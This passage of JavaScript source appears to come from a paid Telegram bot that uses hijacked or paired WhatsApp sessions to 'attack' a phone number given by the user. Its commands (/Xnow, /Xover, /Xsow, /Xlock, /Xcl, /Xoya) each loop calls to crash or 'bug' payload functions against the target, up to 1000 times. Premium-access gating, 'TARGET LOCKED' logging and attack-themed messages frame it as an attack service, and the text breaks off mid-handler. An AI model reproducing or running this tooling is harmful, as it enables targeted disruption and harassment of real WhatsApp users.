    if (caption) {
      await bot.editMessageMedia(
        {
          type: "photo",
          media: botLinks.welcome || defaultLinks.welcome,
          caption: caption,
          parse_mode: "Markdown"
        },
        {
          chat_id: chatId,
          message_id: messageId,
          reply_markup: replyMarkup
        }
      ).catch(() => { });
    }

    await bot.answerCallbackQuery(query.id).catch(() => { });
  } catch (error) {
    if (error.message && error.message.includes('message is not modified')) return;
    if (error.message && error.message.includes('message to edit not found')) return;
    console.error("Error handling callback query:", error);
  }
});
const activeTasks = new Set();

bot.onText(/\/Xnow (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const formattedNumber = match[1].replace(/[^0-9]/g, "");
  const Jid = `${formattedNumber}@s.whatsapp.net`;
  const target = Jid;
  const sleep = ms => new Promise(res => setTimeout(res, ms));

  if (shouldIgnoreMessage(msg)) return;

  if (isCommandBlocked("Xnow") && !isOwner(senderId)) {
    return bot.sendMessage(chatId, `\`\`\`\n✘ мαηтα'χ — COMMAND BLOCKED\n♛ Status  : Sedang Dinonaktifkan\n♛ Info    : Hubungi Owner untuk unblock\n༒︎ •၊၊||၊|།||||།‌‌‌‌‌၊|• мαηтα'χ\n\`\`\``, { parse_mode: "Markdown" });
  }

  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date()) && !isGroupPremium(chatId)) {
    return bot.sendPhoto(chatId, botLinks.default || defaultLinks.default, {
      caption: `\`\`\`KAMU TIDAK MEMILIKI AKSES\`\`\`\n( ! ) Silahkan AddPremium Sebelum Menggunakan Bug`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "𝘖𝘸𝘯𝘦𝘳", url: settings.OWNER_URL }]]
      }
    });
  }

  if (shouldIgnoreMessage(msg)) return;

  if (activeTasks.has(senderId)) {
    return bot.sendMessage(chatId, `\`\`\`\n✘ мαηтα'χ 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘\n
    ♛ ターゲット : ${formattedNumber}\n
    ♛ Status    : Bug Terkirim ✘\n
    ༒︎ •၊၊||၊|།||||།‌‌‌‌‌၊|• мαηтα'χ\n\`\`\``, { parse_mode: "Markdown" });
  }

  activeTasks.add(senderId);

  try {
    if (sessions.size === 0) {
      let totalTersimpan = 0;
      let berhasil = 0;
      let gagal = 0;
      let validNumbers = [];

      if (fs.existsSync(SESSIONS_FILE)) {
        let savedNumbers = [];
        try {
          savedNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE, "utf-8") || "[]");
        } catch (err) {
          savedNumbers = [];
        }

        totalTersimpan = savedNumbers.length;
        validNumbers = [...savedNumbers];

        if (totalTersimpan > 0) {
          const refreshTasks = savedNumbers.map(async (botNumber) => {
            try {
              const sessionDir = createSessionDir(botNumber);
              const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

              const sock = makeWASocket({
                auth: state,
                printQRInTerminal: false,
                logger: P({ level: "silent" }),
                defaultQueryTimeoutMs: undefined,
              });

              return new Promise((resolve) => {
                let done = false;
                const finish = (status) => {
                  if (!done) {
                    done = true;
                    if (status === "success") berhasil++;
                    else gagal++;
                    resolve();
                  }
                };

                sock.ev.on("connection.update", async (update) => {
                  const { connection, lastDisconnect } = update;

                  if (connection === "open") {
                    sessions.set(botNumber, sock);
                    finish("success");
                  } else if (connection === "close") {
                    const statusCode = lastDisconnect?.error?.output?.statusCode;
                    if (statusCode === 401) {
                      validNumbers = validNumbers.filter(num => num !== botNumber);
                      try {
                        fs.rmSync(sessionDir, { recursive: true, force: true });
                      } catch (e) { }
                    }
                    finish("failed");
                  }
                });

                sock.ev.on("creds.update", saveCreds);
                setTimeout(() => finish("failed"), 15000);
              });
            } catch {
              gagal++;
              return Promise.resolve();
            }
          });

          await Promise.all(refreshTasks);

          if (validNumbers.length !== savedNumbers.length) {
            fs.writeFileSync(SESSIONS_FILE, JSON.stringify(validNumbers));
          }
        }
      }

      if (sessions.size === 0) {
        activeTasks.delete(senderId);
        return bot.sendPhoto(chatId, botLinks.default || defaultLinks.default, {
          caption: `\`\`\`\n✘ 𝙾𝚃𝙰𝙓 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘\n
          ♛ Status  : Tidak Ada Sender Aktif\n
          ♛ Info    : Silahkan ReqPair Terlebih Dahulu\n
          ༒︎ •၊၊||၊|།||||།‌‌‌‌‌၊|• мαηтα'χ\n\`\`\``,
          parse_mode: "Markdown"
        });
      }
    }

    const otax = sessions.values().next().value;

    await bot.sendMessage(chatId, `\`\`\`\n✘ мαηтα'χ 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘\n♛ ターゲット : ${formattedNumber}\n♛ Status    : Bug Terkirim ✘\n༒︎ •၊၊||၊|།||||།‌‌‌‌‌၊|• мαηтα'χ\n\`\`\``, { parse_mode: "Markdown" });

    console.log(`\n[ ✘ ] TARGET LOCKED : ${formattedNumber}`);
    console.log(`[ ♛ ] MEMULAI мαηтα'χ ATTACK...\n`);

    for (let i = 0; i < 10; i++) {
      try {
        console.log(`[ + ] Sedang Attack : ${formattedNumber}`);
        console.log(`   ├─> мαηтα'χ Attack You : ${formattedNumber}`);

        await iozzz(otax, target);

        const delay = Math.floor(Math.random() * (3000 - 1500 + 1) + 1500);

        console.log(`   ├─> Status : ✘ Sukses Terkirim`);
        console.log(`   └─> Delay  : ${delay}ms\n`);

        await sleep(delay);
      } catch (err) {
        console.log(`   └─> [ ! ] Error  : ${err.message || 'Unknown Error'}\n`);

        if (err.message && (err.message.includes('closed') || err.message.includes('disconnected'))) {
          console.log(`[ ✘ ] KONEKSI WA TERPUTUS! Loop dihentikan otomatis.\n`);
          break;
        }
      }
    }

    console.log(`[ ♛ ] PROSES SELESAI UNTUK TARGET : ${formattedNumber}\n`);

  } finally {
    activeTasks.delete(senderId);
  }
});
bot.onText(/\/Xover (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const formattedNumber = match[1].replace(/[^0-9]/g, "");
  const Jid = `${formattedNumber}@s.whatsapp.net`;
  const target = Jid;
  const sleep = ms => new Promise(res => setTimeout(res, ms));

  if (shouldIgnoreMessage(msg)) return;

  if (isCommandBlocked("Xover") && !isOwner(senderId)) {
    return bot.sendMessage(chatId, `\`\`\`\n✘ мαηтα'χ — COMMAND BLOCKED\n♛ Status  : Sedang Dinonaktifkan\n♛ Info    : Hubungi Owner untuk unblock\n༒︎ •၊၊||၊|།||||།‌‌‌‌‌၊|• мαηтα'χ\n\`\`\``, { parse_mode: "Markdown" });
  }

  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date()) && !isGroupPremium(chatId)) {
    return bot.sendPhoto(chatId, botLinks.default || defaultLinks.default, {
      caption: `\`\`\`KAMU TIDAK MEMILIKI AKSES\`\`\`\n( ! ) Silahkan AddPremium Sebelum Menggunakan Bug`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "𝘖𝘸𝘯𝘦𝘳", url: settings.OWNER_URL }]]
      }
    });
  }

  if (shouldIgnoreMessage(msg)) return;

  if (activeTasks.has(senderId)) {
    return bot.sendMessage(chatId, `\`\`\`\n✘ мαηтα'χ 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘\n
    ♛ ターゲット : ${formattedNumber}\n
    ♛ Status    : Bug Terkirim ✘\n
    ༒︎ •၊၊||၊|།||||།‌‌‌‌‌၊|• мαηтα'χ\n\`\`\``, { parse_mode: "Markdown" });
  }

  activeTasks.add(senderId);

  try {
    if (sessions.size === 0) {
      let totalTersimpan = 0;
      let berhasil = 0;
      let gagal = 0;
      let validNumbers = [];

      if (fs.existsSync(SESSIONS_FILE)) {
        let savedNumbers = [];
        try {
          savedNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE, "utf-8") || "[]");
        } catch (err) {
          savedNumbers = [];
        }

        totalTersimpan = savedNumbers.length;
        validNumbers = [...savedNumbers];

        if (totalTersimpan > 0) {
          const refreshTasks = savedNumbers.map(async (botNumber) => {
            try {
              const sessionDir = createSessionDir(botNumber);
              const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

              const sock = makeWASocket({
                auth: state,
                printQRInTerminal: false,
                logger: P({ level: "silent" }),
                defaultQueryTimeoutMs: undefined,
              });

              return new Promise((resolve) => {
                let done = false;
                const finish = (status) => {
                  if (!done) {
                    done = true;
                    if (status === "success") berhasil++;
                    else gagal++;
                    resolve();
                  }
                };

                sock.ev.on("connection.update", async (update) => {
                  const { connection, lastDisconnect } = update;

                  if (connection === "open") {
                    sessions.set(botNumber, sock);
                    finish("success");
                  } else if (connection === "close") {
                    const statusCode = lastDisconnect?.error?.output?.statusCode;
                    if (statusCode === 401) {
                      validNumbers = validNumbers.filter(num => num !== botNumber);
                      try {
                        fs.rmSync(sessionDir, { recursive: true, force: true });
                      } catch (e) { }
                    }
                    finish("failed");
                  }
                });

                sock.ev.on("creds.update", saveCreds);
                setTimeout(() => finish("failed"), 15000);
              });
            } catch {
              gagal++;
              return Promise.resolve();
            }
          });

          await Promise.all(refreshTasks);

          if (validNumbers.length !== savedNumbers.length) {
            fs.writeFileSync(SESSIONS_FILE, JSON.stringify(validNumbers));
          }
        }
      }

      if (sessions.size === 0) {
        activeTasks.delete(senderId);
        return bot.sendPhoto(chatId, botLinks.default || defaultLinks.default, {
          caption: `\`\`\`\n✘ 𝙾𝚃𝙰𝙓 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘\n
          ♛ Status  : Tidak Ada Sender Aktif\n
          ♛ Info    : Silahkan ReqPair Terlebih Dahulu\n
          ༒︎ •၊၊||၊|།||||།‌‌‌‌‌၊|• мαηтα'χ\n\`\`\``,
          parse_mode: "Markdown"
        });
      }
    }

    const otax = sessions.values().next().value;

    await bot.sendMessage(chatId, `\`\`\`\n✘ мαηтα'χ 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘\n♛ ターゲット : ${formattedNumber}\n♛ Status    : Bug Terkirim ✘\n༒︎ •၊၊||၊|།||||།‌‌‌‌‌၊|• мαηтα'χ\n\`\`\``, { parse_mode: "Markdown" });

    console.log(`\n[ ✘ ] TARGET LOCKED : ${formattedNumber}`);
    console.log(`[ ♛ ] MEMULAI мαηтα'χ ATTACK...\n`);

    for (let i = 0; i < 5; i++) {
      try {
        console.log(`[ + ] Sedang Attack : ${formattedNumber}`);
        console.log(`   ├─> мαηтα'χ Attack You : ${formattedNumber}`);

        await OtaxAyunBelovedX(otax, target, target);

        const delay = Math.floor(Math.random() * (3000 - 1500 + 1) + 1500);

        console.log(`   ├─> Status : ✘ Sukses Terkirim`);
        console.log(`   └─> Delay  : ${delay + 1000}ms\n`);

        await sleep(delay);
      } catch (err) {
        console.log(`   └─> [ ! ] Error  : ${err.message || 'Unknown Error'}\n`);

        if (err.message && (err.message.includes('closed') || err.message.includes('disconnected'))) {
          console.log(`[ ✘ ] KONEKSI WA TERPUTUS! Loop dihentikan otomatis.\n`);
          break;
        }
      }
    }

    console.log(`[ ♛ ] PROSES SELESAI UNTUK TARGET : ${formattedNumber}\n`);

  } finally {
    activeTasks.delete(senderId);
  }
});
bot.onText(/\/Xsow (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const formattedNumber = match[1].replace(/[^0-9]/g, "");
  const Jid = `${formattedNumber}@s.whatsapp.net`;
  const target = Jid;
  const sleep = ms => new Promise(res => setTimeout(res, ms));

  if (shouldIgnoreMessage(msg)) return;

  if (isCommandBlocked("Xsow") && !isOwner(senderId)) {
    return bot.sendMessage(chatId, `\`\`\`\n✘ мαηтα'χ — COMMAND BLOCKED\n♛ Status  : Sedang Dinonaktifkan\n♛ Info    : Hubungi Owner untuk unblock\n༒︎ •၊၊||၊|།||||།‌‌‌‌‌၊|• мαηтα'χ\n\`\`\``, { parse_mode: "Markdown" });
  }

  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date()) && !isGroupPremium(chatId)) {
    return bot.sendPhoto(chatId, botLinks.default || defaultLinks.default, {
      caption: `\`\`\`KAMU TIDAK MEMILIKI AKSES\`\`\`\n( ! ) Silahkan AddPremium Sebelum Menggunakan Bug`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "𝘖𝘸𝘯𝘦𝘳", url: settings.OWNER_URL }]]
      }
    });
  }

  if (activeTasks.has(senderId)) {
    return bot.sendMessage(chatId, `\`\`\`\n✘ мαηтα'χ 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘\n
    ♛ ターゲット : ${formattedNumber}\n
    ♛ Status    : Bug Terkirim ✘\n
    ༒︎ •၊၊||၊|།||||།‌‌‌‌‌၊|• мαηтα'χ\n\`\`\``, { parse_mode: "Markdown" });
  }

  activeTasks.add(senderId);

  try {
    if (sessions.size === 0) {
      let totalTersimpan = 0;
      let berhasil = 0;
      let gagal = 0;
      let validNumbers = [];

      if (fs.existsSync(SESSIONS_FILE)) {
        let savedNumbers = [];
        try {
          savedNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE, "utf-8") || "[]");
        } catch (err) {
          savedNumbers = [];
        }

        totalTersimpan = savedNumbers.length;
        validNumbers = [...savedNumbers];

        if (totalTersimpan > 0) {
          const refreshTasks = savedNumbers.map(async (botNumber) => {
            try {
              const sessionDir = createSessionDir(botNumber);
              const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

              const sock = makeWASocket({
                auth: state,
                printQRInTerminal: false,
                logger: P({ level: "silent" }),
                defaultQueryTimeoutMs: undefined,
              });

              return new Promise((resolve) => {
                let done = false;
                const finish = (status) => {
                  if (!done) {
                    done = true;
                    if (status === "success") berhasil++;
                    else gagal++;
                    resolve();
                  }
                };

                sock.ev.on("connection.update", async (update) => {
                  const { connection, lastDisconnect } = update;

                  if (connection === "open") {
                    sessions.set(botNumber, sock);
                    finish("success");
                  } else if (connection === "close") {
                    const statusCode = lastDisconnect?.error?.output?.statusCode;
                    if (statusCode === 401) {
                      validNumbers = validNumbers.filter(num => num !== botNumber);
                      try {
                        fs.rmSync(sessionDir, { recursive: true, force: true });
                      } catch (e) { }
                    }
                    finish("failed");
                  }
                });

                sock.ev.on("creds.update", saveCreds);
                setTimeout(() => finish("failed"), 15000);
              });
            } catch {
              gagal++;
              return Promise.resolve();
            }
          });

          await Promise.all(refreshTasks);

          if (validNumbers.length !== savedNumbers.length) {
            fs.writeFileSync(SESSIONS_FILE, JSON.stringify(validNumbers));
          }
        }
      }

      if (sessions.size === 0) {
        activeTasks.delete(senderId);
        return bot.sendPhoto(chatId, botLinks.default || defaultLinks.default, {
          caption: `\`\`\`\n✘ 𝙾𝚃𝙰𝙓 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘\n
          ♛ Status  : Tidak Ada Sender Aktif\n
          ♛ Info    : Silahkan ReqPair Terlebih Dahulu\n
          ༒︎ •၊၊||၊|།||||།‌‌‌‌‌၊|• мαηтα'χ\n\`\`\``,
          parse_mode: "Markdown"
        });
      }
    }

    const otax = sessions.values().next().value;

    await bot.sendMessage(chatId, `\`\`\`\n✘ мαηтα'χ 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘\n♛ ターゲット : ${formattedNumber}\n♛ Status    : Bug Terkirim ✘\n༒︎ •၊၊||၊|།||||།‌‌‌‌‌၊|• мαηтα'χ\n\`\`\``, { parse_mode: "Markdown" });

    console.log(`\n[ ✘ ] TARGET LOCKED : ${formattedNumber}`);
    console.log(`[ ♛ ] MEMULAI мαηтα'χ ATTACK...\n`);

    for (let i = 0; i < 10; i++) {
      try {
        console.log(`[ + ] Sedang Attack : ${formattedNumber}`);
        console.log(`   ├─> мαηтα'χ Attack You : ${formattedNumber}`);

        await docThumb(otax, target, true, true);
        await oombimg(otax, target);
        const delay = Math.floor(Math.random() * (1000 - 1500 + 1) + 1500);

        console.log(`   ├─> Status : ✘ Sukses Terkirim`);
        console.log(`   └─> Delay  : ${delay}ms\n`);

        await sleep(delay);
      } catch (err) {
        console.log(`   └─> [ ! ] Error  : ${err.message || 'Unknown Error'}\n`);

        if (err.message && (err.message.includes('closed') || err.message.includes('disconnected'))) {
          console.log(`[ ✘ ] KONEKSI WA TERPUTUS! Loop dihentikan otomatis.\n`);
          break;
        }
      }
    }

    console.log(`[ ♛ ] PROSES SELESAI UNTUK TARGET : ${formattedNumber}\n`);

  } finally {
    activeTasks.delete(senderId);
  }
});

bot.onText(/\/Xlock (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const formattedNumber = match[1].replace(/[^0-9]/g, "");
  const Jid = `${formattedNumber}@s.whatsapp.net`;
  const target = Jid;
  const sleep = ms => new Promise(res => setTimeout(res, ms));

  if (shouldIgnoreMessage(msg)) return;

  if (isCommandBlocked("Xlock") && !isOwner(senderId)) {
    return bot.sendMessage(chatId, `\`\`\`\n✘ мαηтα'χ — COMMAND BLOCKED\n♛ Status  : Sedang Dinonaktifkan\n♛ Info    : Hubungi Owner untuk unblock\n༒︎ •၊၊||၊|།||||།‌‌‌‌‌၊|• мαηтα'χ\n\`\`\``, { parse_mode: "Markdown" });
  }

  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date()) && !isGroupPremium(chatId)) {
    return bot.sendPhoto(chatId, botLinks.default || defaultLinks.default, {
      caption: `\`\`\`KAMU TIDAK MEMILIKI AKSES\`\`\`\n( ! ) Silahkan AddPremium Sebelum Menggunakan Bug`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "𝘖𝘸𝘯𝘦𝘳", url: settings.OWNER_URL }]]
      }
    });
  }

  if (activeTasks.has(senderId)) {
    return bot.sendMessage(chatId, `\`\`\`\n✘ мαηтα'χ 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘\n
    ♛ ターゲット : ${formattedNumber}\n
    ♛ Status    : Bug Terkirim ✘\n
    ༒︎ •၊၊||၊|།||||།‌‌‌‌‌၊|• мαηтα'χ\n\`\`\``, { parse_mode: "Markdown" });
  }

  activeTasks.add(senderId);

  try {
    if (sessions.size === 0) {
      let totalTersimpan = 0;
      let berhasil = 0;
      let gagal = 0;
      let validNumbers = [];

      if (fs.existsSync(SESSIONS_FILE)) {
        let savedNumbers = [];
        try {
          savedNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE, "utf-8") || "[]");
        } catch (err) {
          savedNumbers = [];
        }

        totalTersimpan = savedNumbers.length;
        validNumbers = [...savedNumbers];

        if (totalTersimpan > 0) {
          const refreshTasks = savedNumbers.map(async (botNumber) => {
            try {
              const sessionDir = createSessionDir(botNumber);
              const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

              const sock = makeWASocket({
                auth: state,
                printQRInTerminal: false,
                logger: P({ level: "silent" }),
                defaultQueryTimeoutMs: undefined,
              });

              return new Promise((resolve) => {
                let done = false;
                const finish = (status) => {
                  if (!done) {
                    done = true;
                    if (status === "success") berhasil++;
                    else gagal++;
                    resolve();
                  }
                };

                sock.ev.on("connection.update", async (update) => {
                  const { connection, lastDisconnect } = update;

                  if (connection === "open") {
                    sessions.set(botNumber, sock);
                    finish("success");
                  } else if (connection === "close") {
                    const statusCode = lastDisconnect?.error?.output?.statusCode;
                    if (statusCode === 401) {
                      validNumbers = validNumbers.filter(num => num !== botNumber);
                      try {
                        fs.rmSync(sessionDir, { recursive: true, force: true });
                      } catch (e) { }
                    }
                    finish("failed");
                  }
                });

                sock.ev.on("creds.update", saveCreds);
                setTimeout(() => finish("failed"), 15000);
              });
            } catch {
              gagal++;
              return Promise.resolve();
            }
          });

          await Promise.all(refreshTasks);

          if (validNumbers.length !== savedNumbers.length) {
            fs.writeFileSync(SESSIONS_FILE, JSON.stringify(validNumbers));
          }
        }
      }

      if (sessions.size === 0) {
        activeTasks.delete(senderId);
        return bot.sendPhoto(chatId, botLinks.default || defaultLinks.default, {
          caption: `\`\`\`\n✘ 𝙾𝚃𝙰𝙓 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘\n
          ♛ Status  : Tidak Ada Sender Aktif\n
          ♛ Info    : Silahkan ReqPair Terlebih Dahulu\n
          ༒︎ •၊၊||၊|།||||།‌‌‌‌‌၊|• мαηтα'χ\n\`\`\``,
          parse_mode: "Markdown"
        });
      }
    }

    const otax = sessions.values().next().value;

    await bot.sendMessage(chatId, `\`\`\`\n✘ мαηтα'χ 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘\n♛ ターゲット : ${formattedNumber}\n♛ Status    : Bug Terkirim ✘\n༒︎ •၊၊||၊|།||||།‌‌‌‌‌၊|• мαηтα'χ\n\`\`\``, { parse_mode: "Markdown" });

    console.log(`\n[ ✘ ] TARGET LOCKED : ${formattedNumber}`);
    console.log(`[ ♛ ] MEMULAI мαηтα'χ ATTACK...\n`);

    for (let i = 0; i < 1000; i++) {
      try {
        console.log(`[ + ] Sedang Attack : ${formattedNumber}`);
        console.log(`   ├─> мαηтα'χ Attack You : ${formattedNumber}`);

        await OtaxAyunBelovedX(otax, target, target);

        console.log(`   ├─> Status : ✘ Sukses Terkirim\n`);
      } catch (err) {
        console.log(`   └─> [ ! ] Error  : ${err.message || 'Unknown Error'}\n`);

        if (err.message && (err.message.includes('closed') || err.message.includes('disconnected'))) {
          console.log(`[ ✘ ] KONEKSI WA TERPUTUS! Loop dihentikan otomatis.\n`);
          break;
        }
      }
    }

    console.log(`[ ♛ ] PROSES SELESAI UNTUK TARGET : ${formattedNumber}\n`);

  } finally {
    activeTasks.delete(senderId);
  }
});
bot.onText(/\/Xcl (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const formattedNumber = match[1].replace(/[^0-9]/g, "");
  const Jid = `${formattedNumber}@s.whatsapp.net`;
  const target = Jid;
  const sleep = ms => new Promise(res => setTimeout(res, ms));

  if (shouldIgnoreMessage(msg)) return;

  if (isCommandBlocked("Xcl") && !isOwner(senderId)) {
    return bot.sendMessage(chatId, `\`\`\`\n✘ мαηтα'χ — COMMAND BLOCKED\n♛ Status  : Sedang Dinonaktifkan\n♛ Info    : Hubungi Owner untuk unblock\n༒︎ •၊၊||၊|།||||།‌‌‌‌‌၊|• мαηтα'χ\n\`\`\``, { parse_mode: "Markdown" });
  }

  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date()) && !isGroupPremium(chatId)) {
    return bot.sendPhoto(chatId, botLinks.default || defaultLinks.default, {
      caption: `\`\`\`KAMU TIDAK MEMILIKI AKSES\`\`\`\n( ! ) Silahkan AddPremium Sebelum Menggunakan Bug`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "𝘖𝘸𝘯𝘦𝘳", url: settings.OWNER_URL }]]
      }
    });
  }

  if (activeTasks.has(senderId)) {
    return bot.sendMessage(chatId, `\`\`\`\n✘ мαηтα'χ 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘\n
    ♛ ターゲット : ${formattedNumber}\n
    ♛ Status    : Bug Terkirim ✘\n
    ༒︎ •၊၊||၊|།||||།‌‌‌‌‌၊|• мαηтα'χ\n\`\`\``, { parse_mode: "Markdown" });
  }

  activeTasks.add(senderId);

  try {
    if (sessions.size === 0) {
      let totalTersimpan = 0;
      let berhasil = 0;
      let gagal = 0;
      let validNumbers = [];

      if (fs.existsSync(SESSIONS_FILE)) {
        let savedNumbers = [];
        try {
          savedNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE, "utf-8") || "[]");
        } catch (err) {
          savedNumbers = [];
        }

        totalTersimpan = savedNumbers.length;
        validNumbers = [...savedNumbers];

        if (totalTersimpan > 0) {
          const refreshTasks = savedNumbers.map(async (botNumber) => {
            try {
              const sessionDir = createSessionDir(botNumber);
              const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

              const sock = makeWASocket({
                auth: state,
                printQRInTerminal: false,
                logger: P({ level: "silent" }),
                defaultQueryTimeoutMs: undefined,
              });

              return new Promise((resolve) => {
                let done = false;
                const finish = (status) => {
                  if (!done) {
                    done = true;
                    if (status === "success") berhasil++;
                    else gagal++;
                    resolve();
                  }
                };

                sock.ev.on("connection.update", async (update) => {
                  const { connection, lastDisconnect } = update;

                  if (connection === "open") {
                    sessions.set(botNumber, sock);
                    finish("success");
                  } else if (connection === "close") {
                    const statusCode = lastDisconnect?.error?.output?.statusCode;
                    if (statusCode === 401) {
                      validNumbers = validNumbers.filter(num => num !== botNumber);
                      try {
                        fs.rmSync(sessionDir, { recursive: true, force: true });
                      } catch (e) { }
                    }
                    finish("failed");
                  }
                });

                sock.ev.on("creds.update", saveCreds);
                setTimeout(() => finish("failed"), 15000);
              });
            } catch {
              gagal++;
              return Promise.resolve();
            }
          });

          await Promise.all(refreshTasks);

          if (validNumbers.length !== savedNumbers.length) {
            fs.writeFileSync(SESSIONS_FILE, JSON.stringify(validNumbers));
          }
        }
      }

      if (sessions.size === 0) {
        activeTasks.delete(senderId);
        return bot.sendPhoto(chatId, botLinks.default || defaultLinks.default, {
          caption: `\`\`\`\n✘ 𝙾𝚃𝙰𝙓 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘\n
          ♛ Status  : Tidak Ada Sender Aktif\n
          ♛ Info    : Silahkan ReqPair Terlebih Dahulu\n
          ༒︎ •၊၊||၊|།||||།‌‌‌‌‌၊|• мαηтα'χ\n\`\`\``,
          parse_mode: "Markdown"
        });
      }
    }

    const otax = sessions.values().next().value;

    await bot.sendMessage(chatId, `\`\`\`\n✘ мαηтα'χ 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘\n♛ ターゲット : ${formattedNumber}\n♛ Status    : Bug Terkirim ✘\n༒︎ •၊၊||၊|།||||།‌‌‌‌‌၊|• мαηтα'χ\n\`\`\``, { parse_mode: "Markdown" });

    console.log(`\n[ ✘ ] TARGET LOCKED : ${formattedNumber}`);
    console.log(`[ ♛ ] MEMULAI мαηтα'χ ATTACK...\n`);

    for (let i = 0; i < 2; i++) {
      try {
        console.log(`[ + ] Sedang Attack : ${formattedNumber}`);
        console.log(`   ├─> мαηтα'χ Attack You : ${formattedNumber}`);

        await packBlank(otax, target);

        console.log(`   ├─> Status : ✘ Sukses Terkirim\n`);
      } catch (err) {
        console.log(`   └─> [ ! ] Error  : ${err.message || 'Unknown Error'}\n`);

        if (err.message && (err.message.includes('closed') || err.message.includes('disconnected'))) {
          console.log(`[ ✘ ] KONEKSI WA TERPUTUS! Loop dihentikan otomatis.\n`);
          break;
        }
      }
    }

    console.log(`[ ♛ ] PROSES SELESAI UNTUK TARGET : ${formattedNumber}\n`);

  } finally {
    activeTasks.delete(senderId);
  }
});

bot.onText(/\/Xoya (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const formattedNumber = match[1].replace(/[^0-9]/g, "");
  const Jid = `${formattedNumber}@s.whatsapp.net`;
  const target = Jid;
  const sleep = ms => new Promise(res => setTimeout(res, ms));

  if (shouldIgnoreMessage(msg)) return;

  if (isCommandBlocked("Xoya") && !isOwner(senderId)) {
    return bot.sendMessage(chatId, `\`\`\`\n✘ мαηтα'χ — COMMAND BLOCKED\n♛ Status  : Sedang Dinonaktifkan\n♛ Info    : Hubungi Owner untuk unblock\n༒︎ •၊၊||၊|།||||།‌‌‌‌‌၊|• мαηтα'χ\n\`\`\``, { parse_mode: "Markdown" });
  }

  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date()) && !isGroupPremium(chatId)) {
    return bot.sendPhoto(chatId, botLinks.default || defaultLinks.default, {
      caption: `\`\`\`KAMU TIDAK MEMILIKI AKSES\`\`\`\n( ! ) Silahkan AddPremium Sebelum Menggunakan Bug`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "𝘖𝘸𝘯𝘦𝘳", url: settings.OWNER_URL }]]
      }
    });
  }

  if (activeTasks.has(senderId)) {
    return bot.sendMessage(chatId, `\`\`\`\n✘ мαηтα'χ 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘\n
    ♛ ターゲット : ${formattedNumber}\n
    ♛ Status    : Bug Terkirim ✘\n
    ༒︎ •၊၊||၊|།||||།‌‌‌‌‌၊|• мαηтα'χ\n\`\`\``, { parse_mode: "Markdown" });
  }

  activeTasks.add(senderId);

  try {
    if (sessions.size === 0) {
      let totalTersimpan = 0;
      let berhasil = 0;
      let gagal = 0;
      let validNumbers = [];

      if (fs.existsSync(SESSIONS_FILE)) {
        let savedNumbers = [];
        try {
          savedNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE, "utf-8") || "[]");
        } catch (err) {
          savedNumbers = [];
        }

        totalTersimpan = savedNumbers.length;
        validNumbers = [...savedNumbers];

        if (totalTersimpan > 0) {
          const refreshTasks = savedNumbers.map(async (botNumber) => {
            try {
              const sessionDir = createSessionDir(botNumber);
              const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

              const sock = makeWASocket({
                auth: state,
                printQRInTerminal: false,
                logger: P({ level: "silent" }),
                defaultQueryTimeoutMs: undefined,
              });

              return new Promise((resolve) => {
                let done = false;
                const finish = (status) => {
                  if (!done) {
                    done = true;
                    if (status === "success") berhasil++;
                    else gagal++;
                    resolve();
                  }
                };

                sock.ev.on("connection.update", async (update) => {
                  const { connection, lastDisconnect } = update;

                  if (connection === "open") {
                    sessions.set(botNumber, sock);
                    finish("success");
                  } else if (connection === "close") {
                    const statusCode = lastDisconnect?.error?.output?.statusCode;
